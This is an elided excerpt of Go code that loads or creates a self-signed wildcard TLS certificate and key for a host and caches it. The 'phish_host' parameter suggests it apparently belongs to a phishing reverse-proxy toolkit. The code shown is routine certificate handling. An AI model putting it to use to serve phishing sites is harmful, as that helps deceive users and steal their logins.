...
func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
	log.Debug("Generating self-signed certificate for %s:%d ...", host, port)

	// Use the project directory for the .cert folder
	projectDir, err := os.Getwd()
	if err != nil {
		return nil, fmt.Errorf("failed to get project directory: %v", err)
	}
	certDir := filepath.Join(projectDir, ".cert")
	...
	// Use wildcard certificate and key inside .cert directory
	certPath := filepath.Join(certDir, "cert.pem")
	keyPath := filepath.Join(certDir, "key.pem")

	// --- LOCK before accessing tlsCache ---
	o.mu.Lock()
	defer o.mu.Unlock()
	// --------------------------------------

	// Check for existing wildcard certificate and private key files
	if _, err := os.Stat(certPath); err == nil {
		if _, err := os.Stat(keyPath); err == nil {
			// Load existing wildcard certificate and private key
			cert, err := tls.LoadX509KeyPair(certPath, keyPath)
			if err != nil {
				return nil, fmt.Errorf("failed to load existing wildcard certificate and key: %v", err)
			}
			o.tlsCache[host] = &cert
			log.Debug("Using existing wildcard certificate and key. Cert Path: %s, Key Path: %s", certPath, keyPath)
			return &cert, nil
		}
	}

	// If not found, generate a new wildcard certificate for *.host
	...
	template := x509.Certificate{
		...
		DNSNames:              []string{wildcardDomain, host},
		BasicConstraintsValid: true,
	}
	template.Subject.CommonName = wildcardDomain

	// Generate the private key and create the certificate
	...
	log.Debug("Wildcard certificate generated: %s", certPath)
	log.Debug("Wildcard private key generated: %s", keyPath)
